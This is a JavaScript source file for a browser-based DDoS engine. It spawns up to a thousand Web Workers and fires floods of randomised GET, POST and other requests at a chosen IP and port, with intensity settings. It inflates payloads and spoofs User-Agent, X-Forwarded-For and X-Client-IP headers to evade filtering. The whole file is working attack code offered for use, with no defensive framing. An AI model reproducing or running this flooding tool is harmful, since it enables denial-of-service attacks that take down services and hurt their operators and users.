// ddos-engine.js - Real DDoS engine
OXYLUS.ddos = {
    active: false,
    workers: [],
    stats: { requests: 0, startTime: null },
    
    target(ip, port = 80, intensity = "hard", duration = 0) {
        if(!OXYLUS.requireAuth()) return;
        
        console.log(`[DDoS] 🚀 Attacking ${ip}:${port}`);
        console.log(`[DDoS] Intensity: ${intensity.toUpperCase()}`);
        
        this.active = true;
        this.stats.startTime = Date.now();
        this.stats.requests = 0;
        
        const config = {
            low: { workers: 100, rps: 50 },
            med: { workers: 300, rps: 200 },
            hard: { workers: 1000, rps: 500 }
        }[intensity] || config.hard;
        
        // Launch workers
        for(let i = 0; i < config.workers; i++) {
            this.launchWorker(ip, port, config);
        }
        
        // Main attack loop
        const attackLoop = setInterval(() => {
            if(!this.active) {
                clearInterval(attackLoop);
                return;
            }
            
            // Send burst of requests
            for(let j = 0; j < config.rps; j++) {
                this.sendRequest(ip, port);
            }
            
            // Check duration
            if(duration > 0) {
                const elapsed = (Date.now() - this.stats.startTime) / 1000;
                if(elapsed >= duration) {
                    console.log(`[DDoS] ⏰ Duration limit reached`);
                    this.stop();
                }
            }
        }, 1000);
        
        // Auto stats logging
        this.logInterval = setInterval(() => {
            const elapsed = (Date.now() - this.stats.startTime) / 1000;
            const rps = elapsed > 0 ? Math.round(this.stats.requests / elapsed) : 0;
            console.log(`[DDoS] 📊 Stats: ${this.stats.requests.toLocaleString()} req | ${rps}/sec`);
        }, 5000);
        
        console.log(`[DDoS] ✅ Attack started with ${config.workers} workers`);
        return { ip, port, intensity, startTime: new Date().toISOString() };
    },
    
    launchWorker(target, port, config) {
        const workerCode = `
            const target = "${target}";
            const port = ${port};
            
            function randomIP() {
                return \`\${Math.floor(Math.random()*256)}.\${Math.floor(Math.random()*256)}.\${Math.floor(Math.random()*256)}.\${Math.floor(Math.random()*256)}\`;
            }
            
            function randomUA() {
                const agents = [
                    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                    'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/537.36',
                    'Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36',
                    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36'
                ];
                return agents[Math.floor(Math.random()*agents.length)];
            }
            
            setInterval(() => {
                for(let i = 0; i < 10; i++) {
                    try {
                        // Multiple request methods
                        const methods = ['GET','POST','PUT','DELETE','OPTIONS'];
                        const method = methods[Math.floor(Math.random()*methods.length)];
                        
                        // Create large payload
                        const params = new URLSearchParams();
                        for(let p = 0; p < 50; p++) {
                            params.append(\`p\${p}\`, Math.random().toString(36).repeat(100));
                        }
                        
                        const url = \`http://\${target}:\${port}/?\${params.toString()}&_\${Date.now()}\${Math.random()}\`;
                        
                        const xhr = new XMLHttpRequest();
                        xhr.open(method, url, true);
                        xhr.setRequestHeader('User-Agent', randomUA());
                        xhr.setRequestHeader('X-Forwarded-For', randomIP());
                        xhr.setRequestHeader('Accept-Language', 'en-US,en;q=0.9');
                        xhr.setRequestHeader('Cache-Control', 'no-cache');
                        xhr.setRequestHeader('Pragma', 'no-cache');
                        xhr.timeout = 2000;
                        xhr.send();
                        
                        // Second request with different parameters
                        const xhr2 = new XMLHttpRequest();
                        xhr2.open('POST', \`http://\${target}:\${port}/api/\${Math.random()}\`, true);
                        xhr2.setRequestHeader('Content-Type', 'application/json');
                        xhr2.send(JSON.stringify({data: Math.random().toString(36).repeat(1000)}));
                        
                    } catch(e) {}
                }
                postMessage('batch');
            }, 50);
        `;
        
        const blob = new Blob([workerCode], {type: 'application/javascript'});
        const worker = new Worker(URL.createObjectURL(blob));
        
        worker.onmessage = () => {
            this.stats.requests += 20; // 2 requests x 10 iterations
        };
        
        this.workers.push(worker);
        return worker;
    },
    
    sendRequest(target, port) {
        try {
            // Direct fetch with random parameters
            const rand = Math.random().toString(36).substring(7);
            fetch(`http://${target}:${port}/?${rand}&_=${Date.now()}`, {
                method: 'GET',
                mode: 'no-cors',
                headers: {
                    'X-Client-IP': `${Math.floor(Math.random()*256)}.${Math.floor(Math.random()*256)}.${Math.floor(Math.random()*256)}.${Math.floor(Math.random()*256)}`,
                    'Referer': `https://www.google.com/search?q=${rand}`,
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
                },
                cache: 'no-store'
            }).catch(() => {});
            
            this.stats.requests++;
        } catch(e) {}
    },
    
    stop() {
        if(!this.active) return;
        
        this.active = false;
        this.workers.forEach(w => w.terminate());
        this.workers = [];
        
        clearInterval(this.logInterval);
        
        const duration = (Date.now() - this.stats.startTime) / 1000;
        const rps = duration > 0 ? Math.round(this.stats.requests / duration) : 0;
        
        console.log(`[DDoS] 🛑 Attack stopped`);
        console.log(`[DDoS] 📈 Final stats:`);
        console.log(`[DDoS]   Total requests: ${this.stats.requests.toLocaleString()}`);
        console.log(`[DDoS]   Duration: ${Math.round(duration)} seconds`);
        console.log(`[DDoS]   Average RPS: ${rps}`);
        console.log(`[DDoS]   Estimated bandwidth: ${Math.round(this.stats.requests * 2 / 1024)} MB`);
    }
};
